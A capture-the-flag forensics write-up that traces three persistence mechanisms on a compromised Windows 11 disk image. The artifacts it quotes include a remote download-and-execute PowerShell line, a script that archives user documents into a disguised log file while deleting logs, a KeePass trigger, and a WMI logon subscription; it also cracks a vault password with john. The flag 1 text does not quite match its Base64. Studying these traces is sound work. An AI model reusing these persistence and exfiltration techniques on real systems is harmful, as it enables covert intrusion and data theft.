
 📝 _Category : Forensics 💯 _Number of points : 97_
 
### Challenge Description
A user on Windows 11 was compromised, and our objective was to identify three persistence mechanisms left on the disk.

We were provided with a ZIP file containing a disk extraction made using KAPE, a forensic tool designed for rapid artifact collection and parsing.

---

## Part 1 - Policy-Based Execution

Upon analyzing the extracted C drive files, I quickly noticed that the `Users` directory was empty, suggesting possible cleanup, evasion techniques, or simply that no user profiles were present in the extracted disk image. Checking installed applications in `C\Program Files\`, the only non-default program was **KeePass Password Safe 2**.  Digging deeper, I found two interesting policy files in its directory:


- `KeePass.config.enforced.xml`
- `KeePass.config.xml`

Inspecting `KeePass.config.enforced.xml`, I discovered an XML configuration specifying an automated execution mechanism:

```xml
<Configuration xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<Application>
<TriggerSystem>
<Triggers>
<Trigger>
<Guid>YDo4UTpYMEywCLHDCJImtw==</Guid>
<Events>
<Event>
<TypeGuid>1M7NtUuYT/KmqeJVJh7I6A==</TypeGuid>
<Parameters/>
</Event>
</Events>
<Conditions/>
<Actions>
<Action>
<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
<Parameters>
<Parameter>cmd.exe</Parameter>
<Parameter>SU5TX1BBUlQxe0tlM1BAcyRCYWNrRDAwcn0=</Parameter>
<Parameter>False</Parameter>
<Parameter>1</Parameter>
<Parameter/>
</Parameters>
</Action>
</Actions>
</Trigger>
</Triggers>
</TriggerSystem>
</Application>
</Configuration>
```

The **Base64-encoded string** caught my eye. Decoding it using **CyberChef** revealed the first flag:

**Flag 1:** `INS_PART1{Ke3P@sc@BackD00r}`

---

## Part 2 - PowerShell Logs & Malicious Service

Remembering previous challenges, I checked PowerShell logs, typically stored in `C:\Windows\System32\winevt\logs`. With only 380 events, it was manageable.

Two key logs stood out:

### Log 1 - Suspicious PowerShell Download (Event ID 600)

```powershell
HostApplication=powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.101:3000/CreateService.ps1')
```

This indicated a remote script execution.

### Log 2 - Execution of a Suspicious Script (Event ID 600)

```powershell
HostApplication=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\User\AppData\Roaming\Microsoft\WindowsBackup.ps1
```

Unfortunately, the script content wasn’t on disk. However, checking **`Microsoft-Windows-PowerShell`** logs (Event ID 4104), I found the executed PowerShell script:

```powershell
while ($true) {
    try {
        Compress-Archive -Path $env:USERPROFILE\Documents\* -DestinationPath C:\Windows\System32\winevt\logs\a.zip -Force
        Remove-Item -Path "C:\Windows\System32\winevt\logs\Microsoft-Windows-Hyper-V-VID-Admin.evtx" -Force
        Rename-Item -Path "C:\Windows\System32\winevt\logs\a.zip" -NewName "Microsoft-Windows-Hyper-V-VID-Admin.evtx" -Force
    } catch {}
    Start-Sleep -Seconds 86400  # 24h
}
```

This script:

- Continuously **archives user documents**
- Stores them in a **fake .evtx log file**, likely for exfiltration or local backup
- Deletes actual log files for stealth

Extracting the fake log:

```bash
$ mv C\Windows\System32\winevt\logs\Microsoft-Windows-Hyper-V-VID-Admin.evtx ./a.zip
$ unzip ./a.zip
```

Inside, I found:

- `flag.txt`
- `VeryConfidential.kdbx` (KeePass vault)

**Flag 2:** `INS_PART2{N@ughTyS3rv!ce}`

---

## Part 3 - WMI Persistence

I felt close to solving the last flag. I merged event logs using [Merge_the_events.ps1](https://github.com/abhinav-eyesOnglass/evtx/blob/master/Merge_the_events.ps1):

```powershell
.\Merge_the_events.ps1 -FolderPath QuietFruitLogs
```

Filtering between **16:25 - 16:30**, I found a **WMI Event Subscription**:

```powershell
instance of __EventFilter
{
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_LogonSession'";
};
instance of CommandLineEventConsumer
{
    CommandLineTemplate = "cmd.exe /c C:\Users\User\Downloads\ChromeSetup.exe";
    Name = "ChromeUpdater";
};
```

This mechanism leverages **`__EventFilter`** to monitor logon sessions and triggers **`CommandLineEventConsumer`** to run `ChromeSetup.exe` whenever a user logs in, ensuring persistence.

Decoding another **Base64-encoded string**, I found:

**Flag 3:** `INS_PART3{WMI_Always_Does_The_Job}`

---

## Easter Eggs

Using the keepass2john:

```
$ python keepass2john.py VeryConfidential.kdbx > VeryConfidential.txt

$ john --format=keepass VeryConfidential.txt
```

John finds that password is `Sexyme`

Simply open the vault using the password, there is one entry called "Easter Egg" with the flag in it.

**Easter Egg Flag** : `INSOTP{E@st3rEgG!!!}`


---

## Final Flag

Concatenating all parts as instructed:

```
INS{Ke3P@sc@BackD00rN@ughTyS3rv!ceWMI_Always_Does_The_Job}
```

---

### Alternative Solution - Grepping Encoded Flags

Some players took a **faster but less investigative** approach by **grepping for Base64-encoded “INS”** or **strings-ing all binary files**. While effective for a CTF, my approach prioritized forensic methodology over speed, mimicking a real-world investigation.

**Final Thoughts:**

- Loved the mix of **policy-based execution, PowerShell abuse, and WMI persistence**.
- The **fake .evtx file** hiding exfiltrated data was a clever trick.
- It was a satisfying challenge with **real-world forensic relevance**!

![Challenge Resolved Grepping Base64 Meme](./images/MemeB64ChallResolved.png)
